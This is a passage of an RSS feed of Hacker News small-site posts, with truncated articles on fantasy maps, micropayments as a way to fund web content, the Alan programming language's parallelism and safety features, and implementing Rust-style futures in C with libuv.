<p>But here’s the trap: the attitude of wanting to know more about a world—and moreover, believing that a map can draw us closer to it—leads the audience to default to a certain passivity. To a certain extent this is the criticism that has always been made of illustration, cinema, or any kind of embellishment beyond mere words alone: that when something is imagined on our behalf, we are robbed of our duty to reconstruct the textual reality for ourselves.</p>
<p>It’s …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.nicholastam.ca/2011/04/18/here-be-cartographers-reading-the-fantasy-map/">http://www.nicholastam.ca/2011/04/18/here-be-cartographers-reading-the-fantasy-map/</a></em></p>]]>
            </description>
            <link>http://www.nicholastam.ca/2011/04/18/here-be-cartographers-reading-the-fantasy-map/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265135</guid>
            <pubDate>Mon, 24 Aug 2020 20:27:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Saving the Web with Tiny Amounts of Money]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265120">thread link</a>) | @finm
<br/>
August 24, 2020 | https://www.finmoorhouse.com/writing/micropayments | <a href="https://web.archive.org/web/*/https://www.finmoorhouse.com/writing/micropayments">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><hr><p>Something about our relationship with content on the Web has quietly turned sour. It took more than one form: ads have inflated and spilled out over the pages they occupy, sometimes blending with the author’s own word. Online journalism on the has monopolised and polarised. Few people agree on exactly what went wrong, and fewer have articulated a way out. Recently I began reading more about the state of ‘<a href="https://www.investopedia.com/terms/m/micropayment.asp">micropayments</a>’. Micropayments offer a diagnosis: that a great deal of trouble has been caused by the way online content is (or isn’t) funded by its consumers. They also offer a solution: a new model for funding content. I find both these things convincing, and the whole story of micropayments just strikes me as intrinsically interesting anyway.</p><p>By ‘content’ I mean articles, blog posts, videos, podcasts, music, and any other digital goodies you choose to consume for entertainment or enrichment rather than necessity. Some of this lives on world-eating media platforms (YouTube, Medium); others pre-established institutions who survived the transition from paper to touchscreen (The Guardian, New York Times); others on independent corners of the web (personal blogs and podcasts). Roughly the same unfortunate dynamics operate in all three places.</p><p>In researching micropayments, I stumbled on <a href="https://www.notion.so/Web-Monetisation-b45b395e66a2464ab04d1f76ba90813f#14d9c7c4157b4abeb6aa468e1c624b75">this article</a> titled ‘The Case for Micropayments’. The problem with free online content, it argued, is precisely that it’s free —consumers don’t expect to pay for it and they don’t get to pay for it. Content providers and platforms instead turn to ads as a source of revenue. That raises a problem:</p><blockquote><p>Ultimately, those who pay for something control it. Currently, most websites that don't sell things are funded by advertising. Thus, they will be controlled by advertisers and will become less and less useful to the users. A veritable arms race has already started with more and more annoying advertisements that intrude on the user's attention in an attempt to survive ever-declining click-through rates.</p></blockquote><p>The point about control is trite but accurate. Advertisers are skittish around thoughtfully provocative content that could tarnish their name, but reward cosmetically provocative content that merely grabs attention. When a site makes money by serving ads, and users have every reason to avoid them, you get severely misaligned incentives. We install ad-blockers to avoid the eyesore of an article wrestling for attention among irrelevant banners, seeking out and killing auto-play videos, and to skip the drudgery of hovering your finger over the ‘skip ad’ button on a YouTube video. So ad providers and adblockers invent increasingly ingenious and costly ways of outmanoeuvring one another. Ad blockers are no longer faintly illicit: Google has <a href="https://www.theverge.com/2018/2/14/17011266/google-chrome-ad-blocker-features">introduced an ad blocker</a> for its own Chrome browser. The advertising revenue lost at the hands of ad blockers is estimated to be in the <a href="https://www.scientificamerican.com/article/where-will-the-ad-versus-ad-blocker-arms-race-end/">tens of billions</a> (total digital ad spending in the US reached $88 billion in 2017). As such, advertisers have every reason to <em>pour</em> resources into thwarting them. Just over 30% of the top sites by traffic now implement <a href="https://www.researchgate.net/publication/303302075_Ad-Blocking_and_Counter_Blocking_A_Slice_of_the_Arms_Race">some means of detecting ad blockers</a>. Facebook has spent so much effort disguising its sponsored posts that it took one major adblocker <a href="https://www.vice.com/en_us/article/7xydvx/facebooks-arms-race-with-adblockers-continues-to-escalate">nearly a full month</a> to spot them. Time and money gets sunk into <a href="https://www.michalhonc.cz/en/blog/7-ways-to-bypass-adblock/">nefarious strategies</a> for hiding, and then re-detecting every last banner ad or auto-play video. And ads must be targeted all the more aggressively and obtrusively at those users who decide not to use (or don’t know about) ad blockers to make up for lost ground. That’s the crucial feature of an arms race – every party involved would prefer that it never occurred.</p><p>Ads are mildly inconvenient, ugly, and massively inefficient. The average person sees between <a href="https://ppcprotect.com/how-many-ads-do-we-see-a-day/">6,000 and 10,000</a> ads <em>per day</em> — with brains adapted for an ancestral environment where any single thing as colourful and information-dense as an advertisement would have <em>dazzled</em>. And digital ads slow down the overall browsing experience because we have to download them in order to see them and then spot them in order to ignore them. Listening to podcasts, most of us blast the ‘fast forward’ button to skip the desperately enthusiastic read-out of copy about mattresses / supplements / trading apps. But because most of us skip the ad, and the rest of us infuriatingly bound to a steering wheel or handlebars just mentally check out; the podcast needs <em>longer</em> and <em>more</em> invasive ads to pay bills. It’s again an arms race, and the result looks ugly for everyone involved.</p><p>Ads do not pay well. A YouTube channel needs many thousands of views before the 5-second ads that play at the beginning can justify the time required to make high-quality videos, for instance. Independent content creators expecting a small but dedicated audience cannot rely on advertisements as a source of income, and nor can the smaller fry in the enormous and increasingly septic pond of online journalism. As such, smaller players die and big players consolidate. Readers (or consumers) lose out on the variety of perspectives lost in the melee. Consider the ‘silent evidence’ of every insightful, thoughtful article, video, or blog that never got written because its author could see no way to monetise it. The people who continue to offer their opinions for free are almost exclusively those people who can afford not to rely on (e.g.) their writing as a source of income. </p><p>When ads alone don’t pay bills, larger sites might turn to data mining: amassing hoards of personal information about your browsing habits, search queries, shopping preferences, and much more. Some of this is packaged and resold to the <a href="https://www.vice.com/en_us/article/bjpx3w/what-are-data-brokers-and-how-to-stop-my-private-data-collection">highest bidder</a>. Personal data is thus <a href="https://www.wired.com/story/wired-guide-personal-data-collection/">likened to oil</a>: fuelling massive tech companies just as the sticky crude stuff fuels industry. Data collection and advertisement are comfortable bedfellows, too: ads compound in value when they’re targeted specifically to you — so the more advertisers know about you, the more valuable their ads become.</p><p>Yet, content is increasingly consumed online. In 2007, 20% of British survey respondents read news online. In 2020, <a href="https://www.statista.com/statistics/286210/online-news-newspapers-and-magazine-consumption-in-great-britain/">the figure is 70%</a>. Clearly, it is easier to sell a physical newspaper than a digital one: paper media costs money by default, online news does not. The prevalent funding models on the Web have effects which spill over into the real world. From <a href="https://www.pressgazette.co.uk/more-than-40-local-news-titles-closed-in-2018-with-loss-of-some-editorial-275-jobs-new-figures-show/">2005 to the end of 2018</a>, the UK lost 245 local news titles on net. The majority of the country is now served by <a href="https://www.bbc.co.uk/news/uk-43106436">no regional newspaper</a> at all. This is exceptionally bad news: one <a href="https://www.kcl.ac.uk/policy-institute/assets/cmcp/local-news.pdf">King’s College study</a> found that those UK towns with no local newspaper showed reduced community engagement ad increased distrust of public institutions. Moreover, constituencies lacking a local newspaper were measurably less likely to be mentioned in the national press during the 2015 national election — presumably because national stories are so often local stories which have percolated upwards. The author of the study <a href="https://www.theguardian.com/media/2019/sep/29/local-newspapers-closing-down-communities-withering">summarises</a>: “when local papers are depleted or in some cases simply don’t exist,  people lose a communal voice. They feel angry, not listened to and more  likely to believe malicious rumour”.</p><p>Subscriptions offer an alternative source of revenue, but subscriptions only work where the consumer is unusually loyal to a specific source (i.e. Sam Harris’ <a href="https://samharris.org/podcast/">podcast</a>), or when the provider aggregates many different sources. Netflix boomed when it was the de facto movie streaming service. Now streaming services are fragmenting, and <a href="https://www.theverge.com/2020/3/10/21172214/streaming-piracy-all-streams-netflix-disney-hbo-hulu-amazon">siloing</a> their own content. Subscriptions favour monopolies, and monopolies favour subscriptions. Platforms consolidate or wither away entirely. By contrast, fragmentation lowers subscription value and seems to <a href="https://www.forbes.com/sites/forbestechcouncil/2019/01/31/streaming-market-fragmentation-driving-piracy-while-hurting-digital-platforms/">incentivise piracy</a>.</p><p>Back to ‘The Case for Micropayments’. The article continues:</p><blockquote><p>Acknowledging that Web advertising is not a sufficient business model, several famous websites have announced that they will start charging subscription fees... Unfortunately, subscriptions are not a good idea on the Web… The main problem with subscription fees is that they provide  <strong>a single choice</strong>: between <strong>paying nothing</strong>  (thus getting nothing) and <strong>paying a large fee</strong> (thus getting everything). Faced with this decision, most users will chose to pay nothing and will go to other sites. It is rare that you will know in advance that you will use a site enough to justify a large fee and the time to register. Thus, most people will only subscribe to very few sites: the Web will be split up into disconnected "docu-islands" and users will be prevented from roaming over the full docuverse.</p></blockquote><p>This seems like an accurate description of the state of play in 2020 – but the phrases ‘docu-islands’ and ‘docuverse’ did seem oddly archaic. I admit I yelped out loud, on checking the article’s date, to see it had been written in 1998.</p><p>Around this time, micropayments really were expected become an indispensable feature of the Web. In writing the specification for <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">HTTP</a>, the authors of the early Web were forced to anticipate the most common errors that a user might encounter, and encode them in the standard server error codes we still use today. 404 still means “page not found”; <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401">401</a> means the client is unauthorised. Standard stuff. When, however, was the last time you encountered an error code 402? The creators of the web standards thought it would represent an equally ubiquitous error: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/402"><em>payment required</em></a>. Error code 402 remains, more than two decades on, ‘reserved for future use’.</p><p>So little has changed about the way content creators make money online in more than <a href="https://www.notion.so/Web-Monetisation-b45b395e66a2464ab04d1f76ba90813f#d43745ad91314ff08f7547a39c55f4f3">two decades</a>:</p><blockquote><p>On today’s web, advertising has become the dominant business model. It’s something Sir Tim Berners Lee and his colleagues at CERN probably couldn’t have imagined when they published the first website nearly three decades ago.</p></blockquote><p>In fact, new and invidious dynamics have emerged which the dotcom pioneers likely could not have foreseen. Smarter recommendation algorithms reward clicks and neglect quality – more clicks means more eyeballs, and more eyeballs means …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.finmoorhouse.com/writing/micropayments">https://www.finmoorhouse.com/writing/micropayments</a></em></p>]]>
            </description>
            <link>https://www.finmoorhouse.com/writing/micropayments</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265120</guid>
            <pubDate>Mon, 24 Aug 2020 20:26:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alan: An almost Turing-Complete language with predictable execution]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24264878">thread link</a>) | @pombo
<br/>
August 24, 2020 | https://alan-lang.org/alan_overview.html | <a href="https://web.archive.org/web/*/https://alan-lang.org/alan_overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- Provide site root to javascript -->


<!-- Work around some values being stored in localStorage wrapped in quotes -->


<!-- Hide / unhide sidebar before it is displayed -->


<!-- Old school interval to adjust the carousel status if a carousel is present on this page -->


<nav id="sidebar" aria-label="Table of contents">
  
  
</nav>

<div id="page-wrapper">

    <div class="page">
      
      
        
        
          
        

        <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
        
        <div id="content">
            <main>
                
<p><strong>16 August 2020 | Luis F. De Pombo, David Ellis</strong></p>
<p>Programming languages are useful not only for what they allow, but what they prevent. That is the key separation between a language and a framework. For good or for ill, a framework can be sidestepped by its users while a language can't.</p>
<p>This overview of Alan will emphasize just as much what it prevents you from doing as what it provides to you. We believe our blend of features and omissions is what general purpose computing needs in the multicore era.</p>
<h2><a href="#what-alan-provides" id="what-alan-provides">What Alan Provides</a></h2>
<p>Alan is a natively-parallel, statically-compiled, type-inferred, evented language with a familiar syntax and many compile-time and run-time safety guarantees.</p>
<h3><a href="#implicitly-parallel" id="implicitly-parallel">Implicitly Parallel</a></h3>
<p>Alan's compiler and runtime automatically recognizes and exploits the parallelism inherent to the computations expressed by some of the language's constructs and automatically managing IO and compute threadpools.</p>
<p><strong>Parallelism over events</strong> is accomplished via the static event system baked into the language:</p>
<pre><code>on http.connection fn (conn: http.Connection) {
  let res: http.Request = conn.res
  res.body("Hello, World!").status(200).send()
}
</code></pre>
<p>Independent connections to the HTTP server are scheduled onto the event loop and the compute threadpool pulls them from the queue and executes them in parallel.</p>
<p><strong>Parallelism over arrays</strong> is accomplished by default through natively-parallel array operations:</p>
<pre><code>someLargeArray
  .filter(fn (val: SomeType): bool = val &gt; someDefaultVal)
  .map(fn (val: SomeType): float64 = val.innerNumber * 3.14159)
  .reduce(fn (acc: float64, cur: float64): float64 = acc + cur)
  .print()
</code></pre>
<p>If the array is large enough and the inner function given to it is pure, each of these steps will run in parallel, utilizing all of the CPU cores on the machine.</p>
<p><strong>IO Concurrency</strong> is accomplished by eagerly running IO-bound opcodes within the runtime based on the dependency graph of statements:</p>
<pre><code>const data: Result&lt;string&gt; = http.get("https://someurl.com/csvfile.csv")
const datacsv: Array&lt;Array&lt;int64&gt;&gt; = (data || '').split('\n').map(fn (row: string): Array&lt;int64&gt; = row.split(',').map(toInt64))
const data2: Result&lt;string&gt;  = http.get("https://someotherdatasource.org/othercsvfile.csv")
const data2csv: Array&lt;Array&lt;int64&gt;&gt; = (data2 || '').split('\n').map(fn (row: string): Array&lt;int64&gt; = row.split(',').map(toInt64))
// Compare the data...
</code></pre>
<p>The Alan runtime will see that the two URL fetches do not depend on each other and can run in parallel, so they will be hoisted to the top of the function call, executed in parallel, and the function execution continues after they return, minimizing overall latency and scheduling costs.</p>
<h3><a href="#statically-compiled-benefits-and-compile-time-safety" id="statically-compiled-benefits-and-compile-time-safety">Statically Compiled Benefits and Compile-Time Safety</a></h3>
<p>Alan has a multi-stage compiler with two compile targets: It's own native AGC bytecode format to be run by its native runtime, and Javascript to allow running in Node.js or the browser.</p>
<p>This will make it possible to make full-stack web applications in Alan that can also be ejected to Javascript if you no longer wish to develop in Alan. ("Will" because the cross-compiler's primary focus has been on correctness, not legibility, of the generated Javascript, but that will improve over time. Also because Alan bindings to Web APIs have not yet been written.)</p>
<p>Being statically compiled brings lots of benefits (and a few drawbacks) to the table. Primarily, the compiler can spot and prevent many classes of trivial errors from getting into production, but at the expense of requiring a compilation step between checking the changes made to your code.</p>
<p>However, Alan takes the safety guarantees to a higher level:</p>
<ul>
<li><strong>No <code>undefined</code> variables, ever:</strong> In Alan, <code>let</code> or <code>const</code> declared variables <em>must</em> be given an initial value. Potentially missing data can be represented with a <code>Maybe&lt;T&gt;</code> type, but then the compiler will force checking for the presence of actual data or providing a default value if not present. Downstream logic can be assured that the type they are working with is real.</li>
<li><strong>Most runtime errors impossible:</strong> Out of memory errors are impossible to avoid, but other issues, such as divide-by-zero, integer under/overflow, array out-of-bounds accesses, etc, are not possible in Alan. Actions that could have runtime errored in other languages are converted into <code>Result&lt;T&gt;</code> types that have to be checked for an error condition and/or have a default value provided instead. (The default set of math operators return <code>Result</code>-wrapped values and can accept such values in place of raw integers or floats, but there is also a second set of math operators copying Rust's <a href="https://doc.rust-lang.org/std/intrinsics/fn.saturating_add.html">saturating arithmetic</a> mechanism that always works on raw integers or floats, and will produce predictable but potentially unexpected values when a runtime error would have been reached, otherwise.)</li>
<li><strong>Deadlocks, Livelocks, and other multithreading issues impossible:</strong> There is no explicit multithreading in Alan. The compiler determines what code you have written is safely parallelizable does this for you. As Alan's compiler and runtime become more intelligent, more code will become parallelized, but with most array operations already being parallelizable as well as all events, the majority of the parallelization possibilities are already covered.</li>
<li><strong>No shared, mutable state:</strong> Alan defers all such responsibility to databases and caching systems that have had decades of work behind them and many tradeoffs between different mechanisms. We may revisit this if we can bring something to the table here with a significant advantage and minimal downsides in the future, however.</li>
</ul>
<h3><a href="#third-party-module-permission-system" id="third-party-module-permission-system">Third-Party Module Permission System</a></h3>
<p>Beyond direct code and syntax safety guarantees, Alan also provides safety mechanisms on third-party modules. Alan's module resolution mechanism includes built-in support for <a href="https://docs.alan-lang.org/module_testing.html">defining mocks</a> and, more importantly, <a href="https://docs.alan-lang.org/module_mutation.html">defining mutations</a> of existing modules. This mechanism can be used to deny third party libraries access to parts of the standard library you are not comfortable with. By simply creating a <code>modules</code> directory within the third-party dependency and then defining an <code>std/app.ln</code> file that re-exports non-functional versions of the types, functions, and events of the original standard library, you can prevent that library from being able to use standard library features you would not expect them to have access to. For instance, if you have imported a very popular utility library for, say, curve fitting. You would not expect it to want to have access to your filesystem or creating a child process, so you could inject nonfunctional mocks of <code>@std/fs</code> and <code>@std/cmd</code>.</p>
<p>This causes the third party code to be compiled without the opcodes it needs to access that functionality at all, providing a defense-in-depth that can be applied along with standard auditing, package signing, and CVE reporting on open source projects. Making this behavior easy-to-use automatically through the package management system is a project goal that will provide users of Alan a layer of security no other project approaches.</p>
<h3><a href="#memory-management" id="memory-management">Memory Management</a></h3>
<p>Most safety in Alan is tackled at compile-time, where it belongs, so you can write code that handles it and it doesn't cause an issue in production. But one major piece that is handled by the runtime for you is memory allocation, access, and deallocation, and Alan does so without GC pauses.</p>
<p>Languages that handle memory management for you, like Java or Python, tend to be more productive languages to work in, with the cost of a Garbage Collector periodically pausing your code to find and clean up unused memory. Languages without that, like C or C++, require extra cognitive overhead to manage it, but tend to be faster and have a lower memory footprint.</p>
<p>In Alan, memory is allocated at the beginning of an event handler's run for all "stack-like" variables (basic constants and variables in the handler and all functions it uses) while "heap-like" variables (arrays and user types) are allocated as needed to the size needed at runtime over the course of the event handler's run. This memory is "owned" by the handler so the event handler is the memory's "lifetime" and after the event handler has finished executing all memory associated with that handler is finally freed in a way that does not affect any other event handlers running on other threads (only if the CPU is truly single-core would there be a noticeable pause).</p>
<p>This "coarse memory ownership model" allows all code written in Alan to not have to worry about memory allocation and deallocation as if it had a Garbage Collector, but without the GC pause issue.</p>
<h3><a href="#type-inferred" id="type-inferred">Type Inferred</a></h3>
<p>Alan's type inference is capable of automatically inferring all function return types and all variable assignment types, only requiring function arguments to be typed. Once <a href="https://github.com/alantech/alan/blob/main/rfcs/006%20-%20Automatic%20Argument%20Interfaces%20RFC.md">this RFC</a> is implemented, it will be capable enough that <em>all</em> of the examples above do not need their types explicitly written out. The following would also work:</p>
<pre><code>on http.connection fn (conn) {
  let res = conn.res
  res.body("Hello, World!").status(200).send()
}
</code></pre>
<pre><code>someLargeArray
  .filter(fn (val) = val &gt; someDefaultVal)
  .map(fn (val) = val.innerNumber * 3.14159)
  .reduce(fn (acc, cur) = acc + cur)
  .print()
</code></pre>
<pre><code>const data = http.get("https://someurl.com/csvfile.csv")
const datacsv = (data || '').split('\n').map(fn (row) = row.split(',').map(toInt64))
const data2 = http.get("https://someotherdatasource.org/othercsvfile.csv")
const data2csv = (data2 || '').split('\n').map(fn (row) = row.split(',').map(toInt64))
// Compare the data...
</code></pre>
<p>This allows you to be as concise or as explicit as you need to be, with very dynamic-looking code in a static language possible.</p>
<h2><a href="#what-alan-removes" id="what-alan-removes">What Alan Removes</a></h2>
<p>Any engineering endeavour is a balance of trade-offs, and some things must be removed to make room for all of the advantages laid out above.</p>
<p>Most languages tend to make a similar set of trade-offs, with the largest "axis" of trade-offs being on how static or …</p></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alan-lang.org/alan_overview.html">https://alan-lang.org/alan_overview.html</a></em></p>]]>
            </description>
            <link>https://alan-lang.org/alan_overview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264878</guid>
            <pubDate>Mon, 24 Aug 2020 20:04:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust-Style Futures in C]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24264841">thread link</a>) | @axelf4
<br/>
August 24, 2020 | https://axelf4.github.io/2020/08/24/rust-style-futures-in-c.html | <a href="https://web.archive.org/web/*/https://axelf4.github.io/2020/08/24/rust-style-futures-in-c.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>All networking applications essentially boil down to stringing together
multiple asynchronous calls in the <em>right</em> way.
Traditionally for programs written in C this would be done through
registering callbacks where the callee either handles the event itself
or dispatches through a state machine.
In such implementations however reasoning about memory safety
can be treacherous, with it sometimes requiring full-program knowledge.
Futures, or promises, as they are also referred to,
ease in that regard by allowing asynchronous programs
to be written in direct style, keeping the control flow linear.</p>

<p>All things considered, I do think that futures can be a good fit
for C programming under the right circumstances.
I also hope this article can serve to help one understand Rust futures,
by being a separate reference that only touches the fundamentals.</p>

<p>The Rust futures story is especially interesting because it is
fundamentally different from the usual workings of futures
in functional languages or, say, JavaScript.
Whereas other implementations are <em>push</em>-based -
meaning you give a function to be pushed to with
the resolved result of the future -
Rust futures are <em>poll</em>-based.
Let us see how this looks in C with the simplification
that we limit ourselves to a single task,
i.e. one top-level future running on one thread.
This is common in embedded programming, and still <em>fairly</em> manageable
without the security guarantees given by Rust.
<a href="https://libuv.org/">libuv</a> is used for the event loop.
No heap allocations will be required - it is all downhill from here
(Get it? Because the stack grows down.) -
other than those imposed by the libuv interface.</p>

<p>The main <a href="https://doc.rust-lang.org/std/future/trait.Future.html"><code>std::future::Future</code></a> trait
translated into C as a virtual method table becomes</p>
<div><div><pre><code><span>enum</span> <span>Poll</span> <span>{</span> <span>POLL_PENDING</span><span>,</span> <span>POLL_READY</span> <span>};</span>

<span>struct</span> <span>Future</span> <span>{</span>
	<span>enum</span> <span>Poll</span> <span>(</span><span>*</span><span>poll</span><span>)(</span><span>struct</span> <span>Future</span> <span>*</span><span>self</span><span>,</span> <span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>);</span>

	<span>// For now let's skip this method</span>
	<span>// void (*drop)(struct Future *self, struct Context *ctx);</span>
<span>};</span>
</code></pre></div></div>
<p>As an example, let us consider the simplest case:
A future that immediately resolves with the number <code>4</code>,</p>
<div><div><pre><code><span>enum</span> <span>Poll</span> <span>simpleFuturePoll</span><span>(</span><span>struct</span> <span>Future</span> <span>*</span><span>self</span><span>,</span> <span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>)</span> <span>{</span>
	<span>struct</span> <span>SimpleFuture</span> <span>*</span><span>state</span> <span>=</span> <span>(</span><span>struct</span> <span>SimpleFuture</span> <span>*</span><span>)</span> <span>self</span><span>;</span>
	<span>self</span><span>-&gt;</span><span>result</span> <span>=</span> <span>4</span><span>;</span>
	<span>return</span> <span>POLL_READY</span><span>;</span>
<span>}</span>

<span>struct</span> <span>SimpleFuture</span> <span>{</span>
	<span>struct</span> <span>Future</span> <span>future</span><span>;</span>
	<span>int</span> <span>result</span><span>;</span>
<span>}</span> <span>simpleFuture</span> <span>=</span> <span>{</span> <span>.</span><span>future</span> <span>=</span> <span>{</span> <span>.</span><span>poll</span> <span>=</span> <span>simpleFuturePoll</span><span>,</span> <span>}</span> <span>};</span>

<span>// ... and in the event loop</span>
<span>simpleFuture</span><span>.</span><span>poll</span><span>(</span><span>&amp;</span><span>simpleFuture</span><span>,</span> <span>ctx</span><span>);</span> <span>// =&gt; POLL_READY</span>
<span>// Here we can now use the result</span>
<span>simpleFuture</span><span>.</span><span>result</span> <span>// =&gt; 4</span>
</code></pre></div></div>
<p>To <em>attempt</em> to resolve the future, we poll it;
it returns <code>POLL_READY</code> and as such we are done.
And for futures that instead return <code>POLL_PENDING</code> when polled,
we just make sure to poll them again later -
futures are lazy and do not make progress unless actively told to do so.
No one knows better than the future itself when it should
be polled again - <em>awoken</em> -
so the context given to all futures allows them to awake their own task.
With many parallel tasks the additional complexity would make itself apparent here,
but in our case something like</p>
<div><div><pre><code><span>struct</span> <span>Context</span> <span>{</span>
	<span>struct</span> <span>Future</span> <span>*</span><span>mainFuture</span><span>;</span>
	<span>uv_loop_t</span> <span>loop</span><span>;</span>
<span>};</span>

<span>void</span> <span>wakeTask</span><span>(</span><span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>)</span> <span>{</span>
	<span>if</span> <span>(</span><span>ctx</span><span>-&gt;</span><span>mainFuture</span><span>-&gt;</span><span>poll</span><span>(</span><span>ctx</span><span>-&gt;</span><span>mainFuture</span><span>,</span> <span>ctx</span><span>)</span> <span>==</span> <span>POLL_READY</span><span>)</span> <span>{</span>
		<span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span> <span>// Finished!</span>
	<span>}</span>
<span>}</span>
</code></pre></div></div>
<p>will suffice.
Polling the future once at startup will then kick off the machinery.</p>

<p>For a libuv timer future, we would want to write something like</p>
<div><div><pre><code><span>enum</span> <span>TimerStatus</span> <span>{</span> <span>TIMER_NOT_STARTED</span><span>,</span> <span>TIMER_WAITING</span><span>,</span> <span>TIMER_FINISHED</span> <span>};</span>

<span>struct</span> <span>TimerFuture</span> <span>{</span>
	<span>struct</span> <span>Future</span> <span>future</span><span>;</span>
	<span>enum</span> <span>TimerStatus</span> <span>status</span><span>;</span>
	<span>union</span> <span>{</span>
		<span>uint64_t</span> <span>timeout</span><span>;</span>
		<span>uv_timer_t</span> <span>*</span><span>handle</span><span>;</span>
	<span>};</span>
<span>};</span>

<span>static</span> <span>void</span> <span>uvCloseFree</span><span>(</span><span>uv_handle_t</span> <span>*</span><span>handle</span><span>)</span> <span>{</span>
	<span>free</span><span>(</span><span>handle</span><span>);</span>
<span>}</span>

<span>static</span> <span>void</span> <span>timerCb</span><span>(</span><span>uv_timer_t</span> <span>*</span><span>handle</span><span>)</span> <span>{</span>
	<span>struct</span> <span>TimerFuture</span> <span>*</span><span>state</span> <span>=</span> <span>handle</span><span>-&gt;</span><span>data</span><span>;</span>
	<span>struct</span> <span>Context</span> <span>*</span><span>ctx</span> <span>=</span> <span>handle</span><span>-&gt;</span><span>loop</span><span>.</span><span>data</span><span>;</span>
	<span>uv_close</span><span>((</span><span>uv_handle_t</span> <span>*</span><span>)</span> <span>handle</span><span>,</span> <span>uvCloseFree</span><span>);</span>
	<span>state</span><span>-&gt;</span><span>status</span> <span>=</span> <span>TIMER_FINISHED</span><span>;</span>
	<span>wakeTask</span><span>(</span><span>ctx</span><span>);</span>
<span>}</span>

<span>static</span> <span>enum</span> <span>Poll</span> <span>timerFuturePoll</span><span>(</span><span>struct</span> <span>Future</span> <span>*</span><span>self</span><span>,</span> <span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>)</span> <span>{</span>
	<span>struct</span> <span>TimerFuture</span> <span>*</span><span>state</span> <span>=</span> <span>(</span><span>struct</span> <span>TimerFuture</span> <span>*</span><span>)</span> <span>self</span><span>;</span>
	<span>switch</span> <span>(</span><span>state</span><span>-&gt;</span><span>status</span><span>)</span> <span>{</span>
		<span>case</span> <span>TIMER_NOT_STARTED</span><span>:</span>
			<span>uint64_t</span> <span>timeout</span> <span>=</span> <span>state</span><span>-&gt;</span><span>timeout</span><span>;</span>
			<span>state</span><span>-&gt;</span><span>handle</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span> <span>*</span><span>state</span><span>-&gt;</span><span>handle</span><span>);</span>
			<span>uv_timer_init</span><span>(</span><span>ctx</span><span>.</span><span>loop</span><span>,</span> <span>&amp;</span><span>state</span><span>-&gt;</span><span>handle</span><span>);</span>
			<span>state</span><span>-&gt;</span><span>handle</span><span>-&gt;</span><span>data</span> <span>=</span> <span>state</span><span>;</span>
			<span>uv_timer_start</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>handle</span><span>,</span> <span>timerCb</span><span>,</span> <span>timeout</span><span>,</span> <span>/* no repeat */</span> <span>0</span><span>);</span>
			<span>state</span><span>-&gt;</span><span>status</span> <span>=</span> <span>TIMER_WAITING</span><span>;</span>
			<span>/* fallthrough */</span>
		<span>case</span> <span>TIMER_WAITING</span><span>:</span>
			<span>return</span> <span>POLL_PENDING</span><span>;</span>
		<span>case</span> <span>TIMER_FINISHED</span><span>:</span>
			<span>return</span> <span>POLL_READY</span><span>;</span>
	<span>}</span>
	<span>return</span> <span>POLL_READY</span><span>;</span>
<span>}</span>

<span>struct</span> <span>TimerFuture</span> <span>timerFutureNew</span><span>(</span><span>uint64_t</span> <span>timeout</span><span>)</span> <span>{</span>
	<span>return</span> <span>(</span><span>struct</span> <span>TimerFuture</span><span>)</span> <span>{</span>
		<span>.</span><span>future</span> <span>=</span> <span>{</span> <span>.</span><span>poll</span> <span>=</span> <span>timerFuturePoll</span><span>,</span> <span>},</span>
		<span>.</span><span>status</span> <span>=</span> <span>TIMER_NOT_STARTED</span><span>,</span>
		<span>.</span><span>timeout</span> <span>=</span> <span>timeout</span><span>,</span>
	<span>};</span>
<span>}</span>
</code></pre></div></div>
<p>The timer handle is made to hold a reference to the future in
its user data field,
so that the callback knows which future to toggle the status on.
However this requires the future object to be pinned in memory,
moving it would make the reference dangling.
Rust deals with this unsafety using the <a href="https://doc.rust-lang.org/std/pin/index.html">Pin construct</a>,
that wraps a pointer type, <code>P</code>,
and only permits operations that cannot move the pointee
(for cases where it may not always be safe to do so, i.e. <code>P: !Unpin</code>)
and ensures its memory remains valid until it gets dropped,
or helps make manually vetted code <em>nonleaky</em>.
In C there is no such thing;
the closest you will get is with a red paragraph buried in the documentation.
This means treading with care,
allocating storage for the main future once and never copying it, and
only referring to futures with pointers to their static place in memory.</p>

<p>Note that it is possible to get by with just one global <code>uv_timer_t</code>
by recognizing that whenever the main future is awoken either:
(I) A timer, necessarily the one with smallest timeout, fired;
or (II) All timers need be dropped and reset, since the futures form a tree,
as we will see.</p>

<h2 id="after-you">After you</h2>

<p>Running multiple futures sequentially is just a matter of
constructing a new future that polls each future to completion,
one after the other.
The poll method of the outer future will have to return <code>POLL_PENDING</code>
after each intermediate step,
before continuing where it left off - like a coroutine.
Rust turns each future into a state machine,
and doing the same in C means playing the part of the Rust compiler.
